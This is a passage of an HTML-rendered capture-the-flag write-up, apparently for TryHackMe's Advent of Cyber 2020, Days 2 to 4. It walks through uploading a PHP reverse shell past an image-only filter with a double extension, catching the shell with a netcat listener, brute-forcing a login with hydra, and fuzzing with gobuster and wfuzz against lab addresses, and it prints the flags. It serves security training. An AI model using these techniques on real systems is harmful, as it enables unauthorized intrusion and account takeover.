242)">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>I have also included the shell script I wrote in the day01-christmas-crisis directory. </p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-2-the-elf-strikes-back">Day 2: The Elf Strikes Back<a href="#day-2-the-elf-strikes-back" class="hash-link" aria-label="Direct link to Day 2: The Elf Strikes Back" title="Direct link to Day 2: The Elf Strikes Back">​</a></h2><p><em>Category: Web</em><br>
<em>Tags: RCE</em>  </p><blockquote><p>Learn about basic file upload filter bypasses by performing a security audit on the new security management server!</p></blockquote><p>IP: <code>10.10.119.58</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="basic-enumeration-1">Basic enumeration<a href="#basic-enumeration-1" class="hash-link" aria-label="Direct link to Basic enumeration" title="Direct link to Basic enumeration">​</a></h3><p>Firstly, I checked the HTTP server running on port 80.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/initial_page-a23a8f39af1f8830e08e6ee3f3ed6674.png" width="1524" height="705" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="what-string-of-text-needs-added-to-the-url-to-get-access-to-the-upload-page">What string of text needs added to the URL to get access to the upload page?<a href="#what-string-of-text-needs-added-to-the-url-to-get-access-to-the-upload-page" class="hash-link" aria-label="Direct link to What string of text needs added to the URL to get access to the upload page?" title="Direct link to What string of text needs added to the URL to get access to the upload page?">​</a></h3><p>We can use the id given to us (<code>ODIzODI5MTNiYmYw</code>) to find an upload page at <code>http://10.10.119.58/?id=ODIzODI5MTNiYmYw</code>.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/initial_page_id-3dde9ba414a9a81304c95984425e65a9.png" width="1515" height="707" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="what-type-of-file-is-accepted-by-the-site">What type of file is accepted by the site?<a href="#what-type-of-file-is-accepted-by-the-site" class="hash-link" aria-label="Direct link to What type of file is accepted by the site?" title="Direct link to What type of file is accepted by the site?">​</a></h3><p>If we examine the source code, we find the following the the HTML code:</p><div class="language-HTML codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-HTML codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;input type=file id=&quot;chooseFile&quot; accept=&quot;.jpeg,.jpg,.png&quot;&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>It turns out that this page only accepts image files.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="in-which-directory-are-the-uploaded-files-stored">In which directory are the uploaded files stored?<a href="#in-which-directory-are-the-uploaded-files-stored" class="hash-link" aria-label="Direct link to In which directory are the uploaded files stored?" title="Direct link to In which directory are the uploaded files stored?">​</a></h3><p>After poking around in the address bar, I found that the uploads are kept in the <code>/uploads/</code> directory.  </p><p>We can find the uploaded files at <code>http://10.10.119.58/uploads/</code>.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-a-shell">Getting a shell<a href="#getting-a-shell" class="hash-link" aria-label="Direct link to Getting a shell" title="Direct link to Getting a shell">​</a></h3><p>Firstly, I wanted to find out what was running the web server. Therefore, I opened the network tab and reloaded the page to get the response headers.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/network_tab-52e81bd9404c3cb7f51539aab5277a49.png" width="1529" height="351" class="img_ev3q"></p><p>We see that the server is running Apache 2.4.37 on CentOS powered by PHP. Therefore, I got a PHP reverse shell script from <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" target="_blank" rel="noopener noreferrer">Pentest Monkey</a>.  </p><p>Be sure to change the following lines in the PHP file:</p><div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ip = &#x27;127.0.0.1&#x27;;  // CHANGE THIS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$port = 1234;       // CHANGE THIS</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then, I renamed the file to <code>php-reverse-shell.jpg.php</code> to circumvent the checks and uploaded the file.</p><p><strong>Establishing the reverse shell connection</strong></p><p>Since I set the PHP reverse shell to connect on port 4444, I set up a netcat listener on that port.</p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">nc -lvnp 4444</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Finally, I visited the following URL <code>http://10.10.119.58/uploads/</code> to run the PHP script.  </p><p>I was then greated by this beautiful message:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Listening on 0.0.0.0 4444</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Connection received on 10.10.119.58 54002</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Linux security-server 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> 13:25:23 up 41 min,  0 users,  load average: 0.00, 0.00, 0.09</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uid=48(apache) gid=48(apache) groups=48(apache)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sh: cannot set terminal process group (823): Inappropriate ioctl for device</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sh: no job control in this shell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sh-4.4$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Bingo! Now that we have a reverse shell, what next?</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-the-flag-in-varwwwflagtxt">What is the flag in /var/www/flag.txt?<a href="#what-is-the-flag-in-varwwwflagtxt" class="hash-link" aria-label="Direct link to What is the flag in /var/www/flag.txt?" title="Direct link to What is the flag in /var/www/flag.txt?">​</a></h3><p>First, I made sure I was successfully connected to the server:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">sh-4.4$ whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">apache</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sh-4.4$ pwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now that we have a shell, we can read the flag:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">sh-4.4$ cat /var/www/flag.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cat /var/www/flag.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">==============================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">You&#x27;ve reached the end of the Advent of Cyber, Day 2 -- hopefully you&#x27;re enjoying yourself so far, and are learning lots! </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">This is all from me, so I&#x27;m going to take the chance to thank the awesome @Vargnaar for his invaluable design lessons, without which the theming of the past two websites simply would not be the same. </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Have a flag -- you deserve it!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Good luck on your mission (and maybe I&#x27;ll see y&#x27;all again on Christmas Eve)!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> --Muiri (@MuirlandOracle)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">==============================================================</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And so with that, we get a nice message and the flag.</p><p>Flag: <code>THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-3-christmas-chaos">Day 3: Christmas Chaos<a href="#day-3-christmas-chaos" class="hash-link" aria-label="Direct link to Day 3: Christmas Chaos" title="Direct link to Day 3: Christmas Chaos">​</a></h2><p><em>Category: Web Exploitation</em><br>
<em>Tags: Authentication Bypass</em>  </p><blockquote><p>Hack the hackers and bypass a login page to gain admin privileges.</p></blockquote><p>IP: <code>10.10.88.75</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="basic-enumeration-2">Basic Enumeration<a href="#basic-enumeration-2" class="hash-link" aria-label="Direct link to Basic Enumeration" title="Direct link to Basic Enumeration">​</a></h3><p>As always, we check out the webpage running on port 80 first.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/initial_page-b71767a8b9843869a720ba32488db468.png" width="1844" height="842" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="brute-force-attack">Brute force attack<a href="#brute-force-attack" class="hash-link" aria-label="Direct link to Brute force attack" title="Direct link to Brute force attack">​</a></h3><p>As suggested by the lesson on TryHackMe, we can use a dictionary attack to break the authentication and gain unauthorized access.  </p><p>First, I created the username and password wordlist using the dictionary provided (<a target="_blank" href="/assets/files/usernames-d0caf4c1e75ec26a50eac989a67a2cdf.txt/">username dictionary</a> and <a target="_blank" href="/assets/files/passwords-11a59e7a6092833476048bda1335029f.txt/">password dictionary</a>).</p><p>Next, I monitored the network traffic in Firefox to see how the login request is being sent. Unsurprisingly, this web app sends a post request with the form data.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/network_tab-a286ff6b96dc6c35552a23af68f2a24a.png" width="1847" height="350" class="img_ev3q"></p><p>Then I used the following <code>hydra</code> command to find the username and password. <code>-L</code> is used to specify the username dictionary, <code>-P</code> is used to specify the password dictionary, http-post-form and the string is used to specify how to send the login request. <code>^USER^</code> and <code>^PASS^</code> are replaced by the username or password from the wordlist respectively. <code>incorrect</code> at the very end it is part error message when we use the wrong username password combo.</p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">hydra -L usernames.txt -P passwords.txt 10.10.88.75 http-post-form &quot;/login:username=^USER^&amp;password=^PASS^:incorrect&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And sure enough, we find the username and password:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">[80][http-post-form] host: 10.10.88.75   login: admin   password: 12345</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now that we have credentials, we can log in and get the flag!</p><p><img loading="lazy" alt="screenshot" src="/assets/images/flag-999be82bc2813e746461f98fc76b7b5c.png" width="1834" height="845" class="img_ev3q"></p><p>Flag: <code>THM{885ffab980e049847516f9d8fe99ad1a}</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-4-santas-watching">Day 4: Santa&#x27;s watching<a href="#day-4-santas-watching" class="hash-link" aria-label="Direct link to Day 4: Santa&#x27;s watching" title="Direct link to Day 4: Santa&#x27;s watching">​</a></h2><p><em>Category: Web Exploitation</em><br>
<em>Tags: Authorization Bypass</em>  </p><blockquote><p>Exploit Santa&#x27;s login form and obtain admin credentials to save Santa&#x27;s nice list!</p></blockquote><p>IP: <code>10.10.252.228</code></p><p>Assets:</p><ul><li>Wordlist for Gobuster (<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt" target="_blank" rel="noopener noreferrer">danielmiessler/SecLists/Discovery/Web-Content/big.txt</a>)</li><li>Wordlist for wfuzz (<a href="https://assets.tryhackme.com/additional/cmn-aoc2020/day-4/wordlist" target="_blank" rel="noopener noreferrer">available for download</a>) (also in the day04-santas-watching directory)</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="given-the-url-httpshibesxyzapiphp-what-would-the-entire-wfuzz-command-look-like-to-query-the-breed-parameter-using-the-wordlist-bigtxt-assume-that-bigtxt-is-in-your-current-directory">Given the URL <code>http://shibes.xyz/api.php</code>, what would the entire wfuzz command look like to query the &quot;breed&quot; parameter using the wordlist &quot;big.txt&quot; (assume that &quot;big.txt&quot; is in your current directory)<a href="#given-the-url-httpshibesxyzapiphp-what-would-the-entire-wfuzz-command-look-like-to-query-the-breed-parameter-using-the-wordlist-bigtxt-assume-that-bigtxt-is-in-your-current-directory" class="hash-link" aria-label="Direct link to given-the-url-httpshibesxyzapiphp-what-would-the-entire-wfuzz-command-look-like-to-query-the-breed-parameter-using-the-wordlist-bigtxt-assume-that-bigtxt-is-in-your-current-directory" title="Direct link to given-the-url-httpshibesxyzapiphp-what-would-the-entire-wfuzz-command-look-like-to-query-the-breed-parameter-using-the-wordlist-bigtxt-assume-that-bigtxt-is-in-your-current-directory">​</a></h3><p><code>wfuzz -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="basic-enumeration-3">Basic Enumeration<a href="#basic-enumeration-3" class="hash-link" aria-label="Direct link to Basic Enumeration" title="Direct link to Basic Enumeration">​</a></h3><p>By know, you probably know the drill. Step 1: visit the website running on port 80.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/nothing-457da9d83e0fba5b3c64586683a1148d.png" width="1846" height="846" class="img_ev3q"></p><p>Huh, there seems to be not much of interest on the page or in the source code for the page.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="finding-the-api-directory-using-gobuster">Finding the API directory using Gobuster<a href="#finding-the-api-directory-using-gobuster" class="hash-link" aria-label="Direct link to Finding the API directory using Gobuster" title="Direct link to Finding the API directory using Gobuster">​</a></h3><p>We can use gobuster to find hidden directories:</p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">gobuster -u http://10.10.252.228/ -w day04-santas-watching/big.txt -x php,txt,html</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And we find the following:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">=====================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Gobuster v2.0.1              OJ Reeves (@TheColonial)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=====================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Mode         : dir</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Url/Domain   : http://10.10.252.228/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Threads      : 10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Wordlist     : day04-santas-watching/big.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Status codes : 200,204,301,302,307,403</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Extensions   : html,php,txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Timeout      : 10s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=====================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/12/04 15:24:55 Starting gobuster</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=====================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/.htpasswd (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/.htpasswd.php (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/.htpasswd.txt (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/.htaccess (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/.htpasswd.html (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/.htaccess.php (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/.htaccess.txt (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/.htaccess.html (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/LICENSE (Status: 200)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/api (Status: 301)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>If we visit <code>http://10.10.252.228/api</code> we can find the empty <code>site-log.php</code> file.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="fuzz-the-date-parameter-on-the-file-you-found-in-the-api-directory-what-is-the-flag-displayed-in-the-correct-post">Fuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post?<a href="#fuzz-the-date-parameter-on-the-file-you-found-in-the-api-directory-what-is-the-flag-displayed-in-the-correct-post" class="hash-link" aria-label="Direct link to Fuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post?" title="Direct link to Fuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post?">​</a></h3><p>We can use the following wfuzz command to fuzz the date get parameter:</p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">wfuzz -c --hh 0 -z file,day04-santas-watching/wordlist http://10.10.252.228/api/site-log.php?date=FUZZ</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>After running the command, we get the following output:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Target: http://10.10.252.228/api/site-log.php?date=FUZZ</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Total requests: 63</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">===================================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ID           Response   Lines    Word     Chars       Payload                                                                                                                                                     </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">===================================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">000000026:   200        0 L      1 W      13 Ch       &quot;20201125&quot;                                                                                                                                                  </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Total time: 3.005774</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Processed Requests: 63</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Filtered Requests: 62</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Requests/sec.: 20.95965</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span 